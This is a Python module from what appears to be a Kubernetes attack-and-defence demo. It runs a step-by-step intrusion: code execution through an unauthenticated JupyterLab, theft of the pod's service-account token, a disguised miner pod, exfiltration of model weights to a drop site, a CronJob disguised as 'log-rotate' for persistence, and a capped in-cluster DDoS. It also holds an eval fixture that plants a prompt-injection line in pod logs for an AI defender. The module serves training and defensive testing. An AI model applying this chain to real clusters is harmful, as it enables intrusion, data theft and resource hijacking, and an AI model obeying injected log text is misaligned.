"""attacks.steps — the attack chain itself, plus recon and cleanup.

Read this top to bottom and you have the whole intrusion. Every step follows the
same shape:
  1. transcript.set_step(...)           — start a fresh section of the play-by-play
  2. _emit("note", ...)                 — narrate what we're about to do
  3. build a code string that calls k8s(...) (see runtime._K8S_PREAMBLE)
  4. _run(code)                         — send it into the notebook kernel; this
                                          also shows the code + output in the UI
  5. store.set_attack_status(...)       — mark this step done + unlock the next
  6. store.add_timeline(...)            — record a defender-visible event

The attacker's power comes entirely from the token stolen in gain_access. No
Kubernetes client library is used; everything runs as Python inside the pod.
"""
from __future__ import annotations

import time
import uuid

from kubernetes import client

from .. import config, jupyter
from .bodies import (
    _cronjob_body,
    _ddos_pod_body,
    _exfil_pod_body,
    _injection_pod_body,
    _miner_pod_body,
)
from ..hub import store
from ..models import AttackResult
from ..k8s import (
    ApiException,
    admin,
    admin_batch,
    admin_core,
    admin_net,
    admin_rbac,
    clear_attacker_token,
    first_pod_name,
)
from .runtime import (
    DDOS_DURATION,
    DDOS_MAX_CONNS,
    DDOS_TARGET_HOST,
    DDOS_TARGET_PORT,
    PROMPT_INJECTION_LINE,
    SA_DIR,
    _created,
    _emit,
    _emit_api_http,
    _gpu_total,
    _K8S_PREAMBLE,
    _refuse,
    _result,
    _run,
    has_kernel,
    teardown_kernel,
)
from ..transcript import transcript


# ---------------------------------------------------------------------------
# Step 1: gain-access — break into the notebook, steal its identity
# ---------------------------------------------------------------------------
def gain_access() -> AttackResult:
    transcript.set_step("gain-access")
    _emit("note", "Recon: look for an unauthenticated JupyterLab exposed on the network — the way "
          "ShadowRay found thousands of open Ray/Jupyter dashboards on the internet.")
    info = jupyter.probe(_emit)
    if not info["reachable"]:
        return _refuse("gain-access", f"No reachable Jupyter at {config.JUPYTER_URL}.")

    _emit("note", "No token, no password. Open a kernel and run code as the notebook's own user "
          "— that is remote code execution inside the pod.")
    # This is the first code we run inside the notebook. The comments are part of the
    # code string on purpose, so they show up in the attacker transcript too.
    code = (
        'import hashlib, os\n'
        '# Kubernetes auto-mounts this pod\'s service-account token on disk. Reading it\n'
        '# IS stealing the pod\'s cluster identity — the credential every later step uses:\n'
        f'tok = open("{SA_DIR}/token").read().strip()\n'
        f'ns = open("{SA_DIR}/namespace").read().strip()\n'
        'print("service-account namespace:", ns)\n'
        'print("token length:", len(tok))            # we never print the token itself\n'
        'print("token sha256[:12]:", hashlib.sha256(tok.encode()).hexdigest()[:12])\n'
        f'print("ca.crt present:", os.path.exists("{SA_DIR}/ca.crt"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("gain-access", f"Kernel execution failed: {e}")

    # Prove the over-grant: ask the API server what this stolen identity may do.
    # SelfSubjectRulesReview = "list my own permissions" — the token answers honestly.
    _emit("note", "Ask the API server what this identity is allowed to do (SelfSubjectRulesReview).")
    rules_code = (
        _K8S_PREAMBLE + "\n"
        'body = {"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",'
        '"spec":{"namespace":_NS}}\n'
        'st, resp = k8s("POST","/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", body)\n'
        'rules = resp.get("status",{}).get("resourceRules",[])\n'
        'print("HTTP", st, "- resource rules for stolen identity:")\n'
        'for r in rules:\n'
        '    if "authorization.k8s.io" in r.get("apiGroups",[]): continue\n'
        '    print("  verbs=%s resources=%s apiGroups=%s" % (r.get("verbs"), r.get("resources"), r.get("apiGroups")))\n'
    )
    try:
        rules_out = _run(rules_code, timeout=45)
        _emit_api_http("POST", "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", rules_out)
    except Exception:  # noqa: BLE001
        pass

    store.set_attack_status("gain-access", "done")
    # Access is the only gate. Once the token is stolen, every follow-on attack becomes
    # available, to run in any order the operator picks (no forced miner->weights->… chain).
    for nxt in ("start-miner", "steal-weights", "persistence", "ddos"):
        store.set_attack_status(nxt, "ready")
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text="Exploited the exposed JupyterLab (no auth), opened a kernel, and confirmed the pod's "
        "over-privileged service-account token. All further actions run inside the notebook.",
        severity="high",
        tool=f"POST {config.JUPYTER_URL}/api/kernels  +  execute_request (read {SA_DIR}/token)",
        target="notebook",
        transcript=transcript.entries_for("gain-access"),
    )
    return _result(True, "gain-access",
                   "Gained code execution in the exposed notebook and located its service-account token.",
                   output=out or "(kernel produced no output)")


# ---------------------------------------------------------------------------
# Step 2: start-miner — create a GPU pod with the stolen token
# ---------------------------------------------------------------------------
def start_miner() -> AttackResult:
    transcript.set_step("start-miner")
    if not has_kernel():
        return _refuse("start-miner", "No kernel yet — run gain-access first.")
    name = f"kube-sync-{uuid.uuid4().hex[:6]}"  # innocuous-looking name
    _emit("note", "Use the stolen token to create a GPU pod — a disguised cryptojacker. (It is a "
          "PyTorch matmul loop with its process name set to xmrig, never real mining software.)")
    before = _gpu_total()
    _emit("output", f"nvidia-smi (platform telemetry): GPU utilization {before}% before the miner.")

    # body is the pod definition (see bodies.py); we repr() it into the code so the
    # kernel POSTs it to the API server with the stolen token via k8s().
    body = _miner_pod_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/api/v1/namespaces/%s/pods" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("start-miner", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/api/v1/namespaces/lawfirm/pods", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:  # 201 Created = the pod was accepted
        return _refuse("start-miner", f"API server rejected the miner pod: {out.strip()[:200]}")
    _created["miner_pod"] = name

    store.set_attack_status("start-miner", "done")  # others stay available; no chain
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Launched disguised cryptojacking pod {name} (process title 'xmrig') requesting 1 GPU, "
        "created with the stolen token from inside the notebook.",
        severity="high",
        tool=f"POST https://kubernetes.default.svc/api/v1/namespaces/lawfirm/pods  (pod/{name}, gpu:1)",
        target=name,
        transcript=transcript.entries_for("start-miner"),
    )

    # The miner takes a few seconds to schedule and warm up, so read its logs + the
    # new GPU number on a background thread instead of blocking the step's response.
    def _tail() -> None:
        time.sleep(20)
        try:
            logs = admin_core().read_namespaced_pod_log(name, config.LAWFIRM_NS, tail_lines=4)
            if logs.strip():
                _emit("output", f"pod/{name} logs:\n{logs.strip()}", step="start-miner")
        except ApiException:
            pass
        _emit("output", f"nvidia-smi (platform telemetry): GPU utilization {_gpu_total()}% after the miner.",
              step="start-miner")

    import threading
    threading.Thread(target=_tail, daemon=True).start()

    return _result(True, "start-miner",
                   f"Miner pod {name} created with the stolen token; it will drive the T4 hard.",
                   output=out.strip() or f"pod/{name} created")


# ---------------------------------------------------------------------------
# Step 3: steal-weights — exfiltrate the firm's model
# ---------------------------------------------------------------------------
def steal_weights() -> AttackResult:
    transcript.set_step("steal-weights")
    if not has_kernel():
        return _refuse("steal-weights", "No kernel yet — run gain-access first.")
    name = f"data-sync-{uuid.uuid4().hex[:6]}"
    _emit("note", "Create a pod that mounts the firm's model-weights volume read-only and uploads "
          "the fine-tuned model to the attacker's drop site. This is the actual data theft.")

    body = _exfil_pod_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/api/v1/namespaces/%s/pods" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("steal-weights", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/api/v1/namespaces/lawfirm/pods", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:
        return _refuse("steal-weights", f"API server rejected the exfil pod: {out.strip()[:200]}")
    _created["exfil_pod"] = name

    store.set_attack_status("steal-weights", "done")  # others stay available; no chain
    store.publish_attack()

    # Wait for the upload pod to finish, then read the REAL byte count out of its logs
    # (the exfil script prints "sent <n> bytes"). This is the evidence the demo shows.
    core = admin_core()
    bytes_sent, logs = 0, ""
    _emit("note", f"Exfil pod {name} is copying {config.WEIGHTS_FILE} to the drop site…")
    for _ in range(150):
        try:
            phase = core.read_namespaced_pod(name, config.LAWFIRM_NS).status.phase
        except ApiException:
            phase = "Unknown"
        if phase in ("Succeeded", "Failed"):
            try:
                logs = core.read_namespaced_pod_log(name, config.LAWFIRM_NS)
            except ApiException:
                logs = ""
            for tok in logs.split():
                if tok.isdigit():
                    bytes_sent = int(tok)
                    break
            break
        time.sleep(1)
    if not bytes_sent:  # fall back to the drop site's own received-bytes log
        bytes_sent = _drop_site_bytes()
    mib = round(bytes_sent / 2**20, 1) if bytes_sent else 0

    if logs.strip():
        _emit("output", f"pod/{name}: {logs.strip()}")
    _emit("http", f"PUT {config.DROP_SERVICE} -> 201 ({bytes_sent} bytes received at the drop site)",
          method="PUT", url=config.DROP_SERVICE, status=201)

    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Exfiltrated {config.WEIGHTS_FILE} ({mib} MiB) from the model-weights volume to the drop site.",
        severity="critical",
        tool=f"pod {name} mounts pvc/model-weights ro -> PUT {config.DROP_SERVICE}",
        target=name,
        transcript=transcript.entries_for("steal-weights"),
    )
    return _result(True, "steal-weights",
                   f"Model weights exfiltrated: {bytes_sent} bytes ({mib} MiB) PUT to the drop site.",
                   output=(logs.strip() or f"pod/{name} created; transfer complete") + f"\nbytes_sent={bytes_sent}")


# ---------------------------------------------------------------------------
# Step 4: persistence — a CronJob that respawns the miner
# ---------------------------------------------------------------------------
def persistence() -> AttackResult:
    transcript.set_step("persistence")
    if not has_kernel():
        return _refuse("persistence", "No kernel yet — run gain-access first.")
    name = "log-rotate"  # disguised as a routine housekeeping job
    _emit("note", "Install a CronJob (disguised as 'log-rotate') that re-launches the miner every "
          "minute, so killing one pod is not enough. This is persistence.")

    body = _cronjob_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/apis/batch/v1/namespaces/%s/cronjobs" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("persistence", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/apis/batch/v1/namespaces/lawfirm/cronjobs", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:
        return _refuse("persistence", f"API server rejected the CronJob: {out.strip()[:200]}")
    _created["cronjob"] = name

    store.set_attack_status("persistence", "done")  # others stay available; no chain
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Installed CronJob {name} (*/1 * * * *) to respawn the miner for persistence.",
        severity="high",
        tool=f"POST https://kubernetes.default.svc/apis/batch/v1/namespaces/lawfirm/cronjobs  (cronjob/{name})",
        target=name,
        transcript=transcript.entries_for("persistence"),
    )
    return _result(True, "persistence",
                   f"Persistence installed: CronJob {name} will respawn the miner every minute.",
                   output=out.strip() or f"cronjob/{name} created")


# ---------------------------------------------------------------------------
# Step 5: ddos — bounded in-cluster connection flood (ShadowRay 2.0)
# ---------------------------------------------------------------------------
def ddos() -> AttackResult:
    """Bounded sockstress-style flood from the compromised pod to an IN-CLUSTER sink.
    ShadowRay 2.0 rents hijacked GPU boxes out as DDoS bots; here it's simulated and
    capped, aimed only at sink.drop-site.svc (see bodies._FLOOD_PY), so nothing leaves the box."""
    transcript.set_step("ddos")
    if not has_kernel():
        return _refuse("ddos", "No kernel yet — run gain-access first.")
    name = f"net-probe-{uuid.uuid4().hex[:6]}"
    _emit("note", "ShadowRay 2.0 also rents compromised GPU boxes out as DDoS bots. Launch a "
          "sockstress-style connection flood from a pod created with the stolen token.")
    _emit("note", f"Safety cap: the target is hard-coded to the in-cluster sink "
          f"{DDOS_TARGET_HOST}:{DDOS_TARGET_PORT}; at most {DDOS_MAX_CONNS} connections "
          f"over {DDOS_DURATION:.0f}s. Nothing leaves the box.")

    body = _ddos_pod_body(name)
    code = (
        _K8S_PREAMBLE + "\n"
        f"body = {body!r}\n"
        'st, resp = k8s("POST", "/api/v1/namespaces/%s/pods" % _NS, body)\n'
        'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
    )
    try:
        out = _run(code, timeout=60)
    except Exception as e:  # noqa: BLE001
        return _refuse("ddos", f"Kernel execution failed: {e}")
    _emit_api_http("POST", "/api/v1/namespaces/lawfirm/pods", out)
    if "HTTP 201" not in out and "HTTP 200" not in out:
        return _refuse("ddos", f"API server rejected the flood pod: {out.strip()[:200]}")
    _created["ddos_pod"] = name

    store.set_attack_status("ddos", "done")
    store.publish_attack()
    store.add_timeline(
        kind="attack", actor="Attacker",
        text=f"Started a bounded DDoS flood from pod {name} to the in-cluster sink "
             f"{DDOS_TARGET_HOST}:{DDOS_TARGET_PORT} ({DDOS_MAX_CONNS} connections max, "
             f"{DDOS_DURATION:.0f}s). It stands in for an external victim site; nothing leaves the box.",
        severity="critical",
        tool=f"POST https://kubernetes.default.svc/api/v1/namespaces/lawfirm/pods  (pod/{name}, egress flood)",
        target=name,
        transcript=transcript.entries_for("ddos"),
    )

    def _tail() -> None:
        time.sleep(DDOS_DURATION + 12)
        try:
            logs = admin_core().read_namespaced_pod_log(name, config.LAWFIRM_NS, tail_lines=8)
            if logs.strip():
                _emit("output", f"pod/{name} logs:\n{logs.strip()}", step="ddos")
        except ApiException:
            pass

    import threading
    threading.Thread(target=_tail, daemon=True).start()

    return _result(True, "ddos",
                   f"Flood pod {name} started: bounded connection flood to {DDOS_TARGET_HOST}:{DDOS_TARGET_PORT} "
                   f"({DDOS_MAX_CONNS} max, {DDOS_DURATION:.0f}s).",
                   output=out.strip() or f"pod/{name} created")


# ---------------------------------------------------------------------------
# Eval fixture: prompt injection (WS-C scenario 7) — not a numbered step
# ---------------------------------------------------------------------------
def plant_prompt_injection() -> dict:
    """Create a pod whose logs contain PROMPT_INJECTION_LINE, then let WS-C check that
    the defender refuses the injected instruction instead of obeying it. When the attack
    chain is live it uses the stolen-token path; from the separate evals process (no
    kernel) it falls back to the operator client so the fixture still works."""
    transcript.set_step("prompt-injection")
    name = f"syslog-{uuid.uuid4().hex[:6]}"
    _emit("note", "Eval fixture: plant a poisoned log line in a pod the defender reads. "
          "This is an untrusted tool output, not an instruction.")

    body = _injection_pod_body(name)
    if has_kernel():
        code = (
            _K8S_PREAMBLE + "\n"
            f"body = {body!r}\n"
            'st, resp = k8s("POST", "/api/v1/namespaces/%s/pods" % _NS, body)\n'
            'print("HTTP", st, "->", resp.get("metadata",{}).get("name") or resp.get("message"))\n'
        )
        try:
            out = _run(code, timeout=60)
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "pod": None, "line": PROMPT_INJECTION_LINE,
                    "message": f"Kernel execution failed: {e}"}
        _emit_api_http("POST", "/api/v1/namespaces/lawfirm/pods", out)
        ok = "HTTP 201" in out or "HTTP 200" in out
        message = (f"Pod {name} is emitting the poisoned log line."
                   if ok else f"API server rejected the injection pod: {out.strip()[:200]}")
    else:
        # Separate evals process: no stolen-token kernel here. Use the operator client;
        # the fixture is test data, not part of the attack chain.
        try:
            from kubernetes.utils import create_from_dict

            create_from_dict(admin(), body, namespace=config.LAWFIRM_NS)
            ok, out = True, f"created pod/{name} via operator client"
            message = f"Pod {name} is emitting the poisoned log line (operator client)."
            _emit("note", "No attack kernel in this process; used the operator client for the eval fixture.")
        except Exception as e:  # noqa: BLE001
            return {"ok": False, "pod": None, "line": PROMPT_INJECTION_LINE,
                    "message": f"Could not create injection pod: {e}"}
    if ok:
        _created["injection_pod"] = name
        _emit("note", f"Poisoned log line planted in pod {name}: {PROMPT_INJECTION_LINE!r}")
    return {"ok": ok, "pod": name if ok else None, "line": PROMPT_INJECTION_LINE, "message": message}


# ---------------------------------------------------------------------------
# Recon (for the attacker app's target panel) — transcript-silent, read-only
# ---------------------------------------------------------------------------
def recon() -> dict:
    """Live target info for the attacker app: is the Jupyter reachable, what can the
    stolen identity do, and the GPU numbers. Uses a THROWAWAY kernel so repeatedly
    polling it never disturbs the attack's own kernel."""
    info = jupyter.probe(None)
    gpus_total = _gpu_total()
    gpu_detail = {}
    try:
        from ..cluster import read_gpus
        gpus, total = read_gpus()
        if gpus:
            g = gpus[0]
            gpu_detail = {"model": g.model, "utilization": g.utilization,
                          "memUsedGiB": g.memUsedGiB, "memTotalGiB": g.memTotalGiB, "tempC": g.tempC}
    except Exception:  # noqa: BLE001
        pass

    rules: list[dict] = []
    if info["reachable"]:
        rules_code = (
            _K8S_PREAMBLE + "\n"
            'body = {"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",'
            '"spec":{"namespace":_NS}}\n'
            'st, resp = k8s("POST","/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", body)\n'
            'rules = [r for r in resp.get("status",{}).get("resourceRules",[]) '
            'if "authorization.k8s.io" not in r.get("apiGroups",[])]\n'
            'print("RULES_JSON=" + json.dumps(rules))\n'
        )
        kid = None
        try:
            kid = jupyter.start_kernel(None)
            out = jupyter.run_code(kid, rules_code, None, timeout=45)
            for line in out.splitlines():
                if line.startswith("RULES_JSON="):
                    import json as _json
                    rules = _json.loads(line[len("RULES_JSON="):])
        except Exception:  # noqa: BLE001
            pass
        finally:
            if kid:
                jupyter.stop_kernel(kid)

    return {
        "jupyter": info,
        "identity": {"serviceAccount": "notebook", "namespace": config.LAWFIRM_NS, "rules": rules},
        "gpu": {"total": gpus_total, **gpu_detail},
        "target": config.JUPYTER_URL,
    }


# ---------------------------------------------------------------------------
# Reset — undo everything the attack did, so the demo can run again
# ---------------------------------------------------------------------------
def _drop_site_bytes() -> int:
    """Read the attacker drop site's log for the 'received <n> bytes' line (a backup
    source for the exfil byte count if the exfil pod's own log was missed)."""
    pod = first_pod_name(admin(), config.DROP_NS, "app=drop")
    if not pod:
        return 0
    try:
        logs = admin_core().read_namespaced_pod_log(pod, config.DROP_NS, tail_lines=20)
    except ApiException:
        return 0
    for line in logs.splitlines():
        if "received" in line and config.WEIGHTS_FILE in line:
            for tok in line.split():
                if tok.isdigit():
                    return int(tok)
    return 0


def _delete_attack_objects() -> list[str]:
    """Delete everything labelled hackutd/attack=true: CronJobs, the Jobs they spawned,
    pods, and the defender's quarantine NetworkPolicies. One label selector finds them all."""
    done: list[str] = []
    sel = f"{config.ATTACK_LABEL_KEY}=true"
    opts = client.V1DeleteOptions(grace_period_seconds=0, propagation_policy="Background")
    core, batch, net = admin_core(), admin_batch(), admin_net()
    try:
        cronjobs = batch.list_namespaced_cron_job(config.LAWFIRM_NS, label_selector=sel).items
    except ApiException:
        cronjobs = []
    for cj in cronjobs:
        try:
            batch.delete_namespaced_cron_job(cj.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"cronjob/{cj.metadata.name}")
        except ApiException:
            continue  # one already-gone object must not strand the rest
    try:
        jobs = batch.list_namespaced_job(config.LAWFIRM_NS, label_selector=sel).items
    except ApiException:
        jobs = []
    for job in jobs:
        try:
            batch.delete_namespaced_job(job.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"job/{job.metadata.name}")
        except ApiException:
            continue
    try:
        pods = core.list_namespaced_pod(config.LAWFIRM_NS, label_selector=sel).items
    except ApiException:
        pods = []
    for p in pods:
        try:
            core.delete_namespaced_pod(p.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"pod/{p.metadata.name}")
        except ApiException:
            continue
    try:
        netpols = net.list_namespaced_network_policy(config.LAWFIRM_NS).items
    except ApiException:
        netpols = []
    for np in netpols:
        if not np.metadata.name.startswith("quarantine-"):
            continue
        try:
            net.delete_namespaced_network_policy(np.metadata.name, config.LAWFIRM_NS, body=opts)
            done.append(f"networkpolicy/{np.metadata.name}")
        except ApiException:
            continue
    return done


def _uncordon() -> None:
    """Re-enable any node the defender cordoned (marked unschedulable) during a run."""
    core = admin_core()
    for node in core.list_node().items:
        if node.spec.unschedulable:
            core.patch_node(node.metadata.name, {"spec": {"unschedulable": False}})


def _restore_rolebinding() -> bool:
    """Re-create the notebook-dev RoleBinding if the defender revoked it (so the next
    run's gain-access has its over-privileged token back). Returns True if it re-created one."""
    rbac = admin_rbac()
    try:
        rbac.read_namespaced_role_binding("notebook-dev", config.LAWFIRM_NS)
        return False  # already present, nothing to do
    except ApiException:
        pass
    rb = client.V1RoleBinding(
        metadata=client.V1ObjectMeta(name="notebook-dev", namespace=config.LAWFIRM_NS),
        subjects=[client.RbacV1Subject(kind="ServiceAccount", name="notebook", namespace=config.LAWFIRM_NS)],
        role_ref=client.V1RoleRef(api_group="rbac.authorization.k8s.io", kind="Role", name="notebook-dev"),
    )
    try:
        rbac.create_namespaced_role_binding(config.LAWFIRM_NS, rb)
        return True
    except ApiException:
        return False


def _clear_drop_site() -> None:
    """Wipe the attacker drop-site pod so a stale 'received bytes' log can't leak into
    the next run's scope detection."""
    opts = client.V1DeleteOptions(grace_period_seconds=0, propagation_policy="Background")
    try:
        for p in admin_core().list_namespaced_pod(config.DROP_NS, label_selector="app=drop").items:
            admin_core().delete_namespaced_pod(p.metadata.name, config.DROP_NS, body=opts)
    except ApiException:
        pass


def reset() -> AttackResult:
    """Full teardown: delete attacker objects, undo defender actions, kill the kernel,
    clear the incident, and re-seed clean scope — so the demo can be run again."""
    deleted = _delete_attack_objects()
    _uncordon()
    restored = _restore_rolebinding()
    _clear_drop_site()
    teardown_kernel()        # stop the attacker's Jupyter kernel
    clear_attacker_token()
    _created.clear()
    transcript.clear()

    store.reset_incident_state()
    from ..cluster import build_cluster, seed_assets
    for a in seed_assets():  # seed_assets() only returns the list; upsert each back in
        store.assets[a.id] = a
    try:
        store.set_cluster(build_cluster(list(store.gpu_history)))
    except Exception:  # noqa: BLE001
        pass
    store.publish({"type": "snapshot", "snapshot": store.snapshot().model_dump(exclude_none=True)})

    msg = f"Cluster cleaned: removed {len(deleted)} attacker object(s); "
    msg += "notebook RoleBinding restored; " if restored else "RoleBinding intact; "
    msg += "node uncordoned; drop site wiped; attacker kernel killed."
    return AttackResult(ok=True, step="reset", message=msg,
                        output="\n".join(deleted) or "no attacker objects present",
                        attack=store.attack_list())


# ---------------------------------------------------------------------------
# Dispatch: step id -> function (what POST /attack/{step} calls)
# ---------------------------------------------------------------------------
def run_step(step_id: str) -> AttackResult:
    return {
        "gain-access": gain_access,
        "start-miner": start_miner,
        "steal-weights": steal_weights,
        "persistence": persistence,
        "ddos": ddos,
    }[step_id]()
